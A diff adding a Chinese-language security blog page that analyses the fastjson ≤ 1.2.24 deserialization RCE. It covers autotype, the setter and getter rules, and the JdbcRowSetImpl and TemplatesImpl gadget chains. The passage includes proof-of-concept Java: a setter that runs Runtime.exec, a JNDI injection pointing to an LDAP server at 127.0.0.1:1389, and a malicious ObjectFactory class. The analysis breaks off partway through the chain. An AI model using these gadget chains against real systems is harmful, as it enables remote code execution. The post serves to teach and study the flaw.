@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="本篇主要分析 fastjson 漏洞成因，以及相关利用链">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="本篇主要分析 fastjson 漏洞成因，以及相关利用链">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303111017654.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303180240880.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303202113728.png">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303211636875.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303213948348.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304202716444.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203119198.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203745677.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203719889.png?lastModify=1616638059">
+<meta property="og:image" content="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303214247173.png?lastModify=1616638059">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210304205659290.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210304210508557.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305004613560.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305152951922.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153241962.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153843235.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305153939734.png">
+<meta property="og:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210305155946719.png">
+<meta property="article:published_time" content="2021-03-02T16:31:12.000Z">
+<meta property="article:modified_time" content="2021-03-29T06:41:56.522Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303111017654.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/03/05/Spring-framework-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析&body=Check out this article: http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析&description=&lt;p&gt;本篇主要分析 fastjson 漏洞成因，以及相关利用链&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#About-fastjson"><span class="toc-number">1.</span> <span class="toc-text">About fastjson</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-%E5%88%A9%E7%94%A8%E9%93%BE%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC"><span class="toc-number">1.1.</span> <span class="toc-text">fastjson 利用链影响的版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">序列化与反序列化机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setter-%E8%B7%9F-getter-%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">setter 跟 getter 的限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-demo"><span class="toc-number">1.4.</span> <span class="toc-text">RCE demo</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JdbcRowSetImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">JdbcRowSetImpl 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">利用链分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TemplatesImpl-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">TemplatesImpl 利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">利用链分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">4.</span> <span class="toc-text">REF</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        fastjson ≤ 1.2.24 反序列化 RCE 漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-03-02T16:31:12.000Z" itemprop="datePublished">2021-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/fastjson/" rel="tag">fastjson</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>本篇主要分析 fastjson 漏洞成因，以及相关利用链</p>
+<span id="more"></span>
+
+<h1 id="About-fastjson"><a href="#About-fastjson" class="headerlink" title="About fastjson"></a>About fastjson</h1><p>fastjson是阿里巴巴的开源JSON解析库，主要作用是在 JSON 格式和 JavaBean 之间进行转换</p>
+<p>fastjson反序化列框架图如下</p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303111017654.png"></p>
+<h2 id="fastjson-利用链影响的版本"><a href="#fastjson-利用链影响的版本" class="headerlink" title="fastjson 利用链影响的版本"></a>fastjson 利用链影响的版本</h2><p>关于网上有些文章写到最初 fastjson 利用版本为 1.2.22-1.2.24，我对此很疑惑，因为翻看官网的安全公告-<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">security_update_20170315</a>，里面提到了影响版本是 <strong>1.2.24以及之前版本</strong>，因此不太清楚 1.2.22 这个版本的来源</p>
+<blockquote>
+<p>最近发现fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞，为了保证系统安全，请升级到1.2.28/1.2.29/1.2.30/1.2.31或者更新版本。</p>
+</blockquote>
+<p>最终经过 Maven 不停的切换测试以及fastjson wiki的寻找，发现了 fastjson 的<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/Feature_SupportNonPublicField_cn">这次更新</a>，里面涉及到了的关于 NonPublicField 的反序列化的改动，具体是在 1.2.22 及以上支持，而用到这一点的应该就只有 TemplatesImpl 利用链，下面的 JdbcRowSetImpl 利用链是不受影响的</p>
+<h2 id="序列化与反序列化机制"><a href="#序列化与反序列化机制" class="headerlink" title="序列化与反序列化机制"></a>序列化与反序列化机制</h2><p>从上图 JSON 模块可以看出来一般我们会用到几个方法</p>
+<ul>
+<li>序列化<ul>
+<li><code>toJSONString()</code></li>
+</ul>
+</li>
+<li>反序列化<ul>
+<li><code>JSON.parseObject()</code>：返回的是 JSONObject<ul>
+<li>JSON文本解析成 JSONObject 类型：<code>JSON.parseObject(&quot;&#123;...&#125;&quot;);</code></li>
+<li>JSON文本解析成 Demo.class 类：<code>JSON.parseObject(&quot;&#123;...&#125;&quot;, Demo.class);</code></li>
+</ul>
+</li>
+<li><code>JSON.parse()</code>：返回的是实际类型的对象</li>
+</ul>
+</li>
+</ul>
+<p><strong>以下demo 测试以 fastjson 1.2.24 为例</strong></p>
+<p>测试流程参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1192/">https://paper.seebug.org/1192/</a></p>
+<p>深入方法差异，原文总结的已经很好了，这里引用原文的结论：</p>
+<ul>
+<li><p><code>JSON.parse(serializedStr)</code></p>
+<ul>
+<li>在指定了<code>@type</code> 的情况下，自动调用了 User 类默认构造器，User类对应的 setter 方法（<code>setAge</code>，<code>setName</code>），<strong>最终结果是 User类的一个实例</strong></li>
+<li>&lt;= 1.2.25 autotype默认开启</li>
+<li>不过值得注意的是 <code>public sex</code> 被成功赋值了，<code>private address</code> 没有成功赋值，不过在1.2.22, 1.1.54.android之后，增加了一个 SupportNonPublicField 特性，如果使用了这个特性，那么 <code>private address</code>就算没有setter、getter也能成功赋值，<strong>这个特性也与后面的一个漏洞有关</strong></li>
+<li>注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害</li>
+</ul>
+</li>
+<li><p><code>JSON.parseObject(serializedStr)</code></p>
+</li>
+<li><p>在指定了 <code>@type</code> 的情况下，自动调用了User类默认构造器，User 类对应的 setter 方法（<code>setAge</code>，<code>setName</code>）以及对应的 getter 方法（<code>getAge</code>，<code>getName</code>），<strong>最终结果是一个字符串</strong></p>
+<ul>
+<li>这里还多调用了getter（注意bool类型的是 is 开头的）方法，是因为parseObject 在没有其他参数时，调用了<code>JSON.toJSON(obj)</code>，后续会通过 gettter 方法获取obj属性值：</li>
+</ul>
+</li>
+<li><p><code>JSON.parseObject(serializedStr, Object.class)</code></p>
+</li>
+<li><p>从结果可以看出在指定了 <code>@type</code> 的情况下，这种写法和第一种<code>JSON.parse(serializedStr)</code>写法没有区别</p>
+</li>
+<li><p><code>JSON.parseObject(serializedStr, User.class)</code></p>
+<ul>
+<li>在指定了 <code>@type</code> 的情况下，自动调用了 User 类默认构造器，User 类对应的 setter 方法（<code>setAge</code>，<code>setName</code>），<strong>最终结果是 User 类的一个实例</strong></li>
+<li>这种写法明确指定了目标对象必须是 User 类型，如果 <code>@type</code> 对应的类型不是 User 类型或其子类，将抛出不匹配异常，但是，就算指定了特定的类型，依然有方式在类型匹配之前来触发漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="setter-跟-getter-的限制"><a href="#setter-跟-getter-的限制" class="headerlink" title="setter 跟 getter 的限制"></a>setter 跟 getter 的限制</h2><p>通过前面的测试我们证明 fastjson 有在反序列化中调用 getter、setter、is 方法的特性，但是通过源码分析，其实这个调用是有限制的</p>
+<p><strong>先看 setter 的限制</strong></p>
+<p><code>com.alibaba.fastjson.util.JavaBeanInfo#build</code></p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303180240880.png"></p>
+<ol>
+<li>方法名长度 ≥ 4</li>
+<li>非静态方法</li>
+<li>返回类型等于void类型或当前类</li>
+<li>方法名以set开头</li>
+<li>参数个数为1</li>
+</ol>
+<p><strong>再看 getter 的限制</strong></p>
+<p><img src="/2021/03/03/fastjson-%E2%89%A4-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210303202113728.png"></p>
+<ol>
+<li>方法名长度 ≥ 4</li>
+<li>非静态方法</li>
+<li>以get开头且第4个字母为大写</li>
+<li>无传入参数</li>
+<li>返回值类型继承自 <code>Collection Map AtomicBoolean AtomicInteger AtomicLong</code></li>
+</ol>
+<h2 id="RCE-demo"><a href="#RCE-demo" class="headerlink" title="RCE demo"></a>RCE demo</h2><p>根据其  fastjson 的反序列化特性，我理解的 fastjson 反序列化攻击面的是在反序列化过程中调用这些  getter、setter、is 方法，而这些方法中往往有一些敏感的操作，可以被直接利用或者作为利用链的一部分来调用</p>
+<p>因此我们可以人为构造一个恶意 demo </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String jsonDemo = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.p2hm1n.fastjsondemo.UserCalc\&quot;, \&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(jsonDemo.getClass());</span><br><span class="line">        Object obj = JSON.parseObject(jsonDemo);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserCalc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述的demo是我们构造的 setter 方法里直接有敏感操作的，下面我们谈一些关于利用链的</p>
+<p>需要注意的是 fastjson 1.2.24及之前没有任何防御，并且autotype默认开启</p>
+<p>其中主要有两个利用链</p>
+<ol>
+<li>JNDI：<code>com.sun.rowset.JdbcRowSetImpl</code></li>
+<li>JDK7u21：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li>
+</ol>
+<h1 id="JdbcRowSetImpl-利用链"><a href="#JdbcRowSetImpl-利用链" class="headerlink" title="JdbcRowSetImpl 利用链"></a>JdbcRowSetImpl 利用链</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>JdbcRowSetImpl 利用链通用性很强，适用于以下 JSON 反序列化方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.parse(evil);</span><br><span class="line">JSON.parseObject(evil);</span><br><span class="line">JSON.parseObject(evil, Object.class);</span><br></pre></td></tr></table></figure>
+
+<p>受限同 JNDI 注入 JDK 版本限制相同</p>
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303211636875.png?lastModify=1616638059" alt="img"></p>
+<ul>
+<li>JDK 5u45、6u45、7u21、8u121 开始 java.rmi.server.useCodebaseOnly 默认配置为true</li>
+<li>JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false</li>
+<li>JDK 11.0.1、8u191、7u201、6u211 com.sun.jndi.ldap.object.trustURLCodebase 默认为false</li>
+</ul>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>核心原理就是 setter 的调用，因此我们可以实现一个 Level-0 RCE demo</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JdbcDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws SQLException &#123;</span><br><span class="line">        JdbcRowSetImpl calcDemo = new JdbcRowSetImpl();</span><br><span class="line">        calcDemo.setDataSourceName(&quot;ldap://127.0.0.1:1389/Calc&quot;);</span><br><span class="line">        calcDemo.setAutoCommit(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意类</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.Name;</span><br><span class="line">import javax.naming.spi.ObjectFactory;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Hashtable;</span><br><span class="line"></span><br><span class="line">public class Calc implements ObjectFactory &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210303213948348.png?lastModify=1616638059" alt="image-20210303213948348"></p>
+<p>分析一下调用过程</p>
+<p>首先 <code>setAutoCommit</code> 会调用 connect</p>
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304202716444.png?lastModify=1616638059" alt="img"></p>
+<p>后续在 <code>com.sun.rowset.JdbcRowSetImpl#connect</code> 中 lookup 可控，造成了 JNDI 注入，随后的调用链为 JNDI 的调用链</p>
+<p><img src="file:///Users/p2hm1n/Documents/Markdown/MyBlog/source/_posts/fastjson-≤-1-2-24-反序列化-RCE-漏洞分析/image-20210304203119198.png?lastModify=1616638059" alt="img"></p>
+<p>跟进 <code>getDataSourceName</code></p>
